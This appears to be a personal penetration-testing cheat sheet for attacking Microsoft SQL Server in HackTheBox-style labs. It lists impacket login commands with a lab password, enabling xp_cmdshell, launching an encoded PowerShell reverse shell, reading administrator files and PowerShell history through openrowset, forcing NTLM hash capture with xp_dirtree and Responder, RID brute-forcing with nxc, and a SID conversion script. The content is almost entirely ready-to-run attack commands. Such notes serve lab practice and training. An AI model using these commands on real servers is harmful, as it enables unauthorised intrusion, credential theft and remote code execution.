
## mssqlclient.py - authentication


```bash

mssqlclient.py 'sequel.htb/sa:MSSQLP@ssw0rd!@dc01.sequel.htb'

```


PS: windows-auth is false by default

```bash

KRB5CCNAME=administrator.ccache mssqlclient.py -k --windows-auth dc01.signed.htb
```


- enable_xp_cmdshell
- xp_cmdshell whoami;

## checking permission of current user

```mssql

SELECT SYSTEM_USER AS CurrentLogin, USER_NAME() AS CurrentUser;

```

## Reverse shell 

```mssql

xp_cmdshell powershell -e <Powshershell encrpted using revshells.com>

```

## Enumeration

| commands                                                                                                                                                   | purpose                                |
| ---------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------- |
| enum_db                                                                                                                                                    | database enum                          |
| enum_links                                                                                                                                                 | server linked to any other resource    |
| enum_logins                                                                                                                                                | logged in users                        |
| enum_users                                                                                                                                                 | enum users                             |
| enum_owner                                                                                                                                                 | enum owner                             |
| select @@servername                                                                                                                                        | hostname                               |
| select default_domain();                                                                                                                                   | domain                                 |
| select * FROM openrowset(BULK 'c:\users\administrator\desktop\root.txt', SINGLE_CLOB) as CONTENTS;(but become mssqlsvc user) and try to read this file too | read files from system including admin |
|                                                                                                                                                            |                                        |
"C:\Users\Administrator\appdata\roaming\microsoft\windows\powershell\PSReadline\consolehost_history.txt"
## Stealing mssql hash 

```bash

xp_dirtree \\<ip>\Doesn'tmatter

```

standup a Responder to steal hash

[[Responder.py#Starting command]]


## enumerate users using nxc 

```bash
nxc mssql <ip> -u '' -p '' --local-auth --rid-brute <max-rid>## for example rid=2000

```


## capturing the SID

```bash

select SUSER_SID('domain\user')

# select SUSER_SID('signed\administrator')
```

python script to convert raw SID to SID

```python
from impacket.dcerpc.v5.dtypes import SID

raw_sid = ''

admin = SID(bytes.fromhex(raw_sid)).formatCanonical()

```

we only need domain SID exclude user identifier


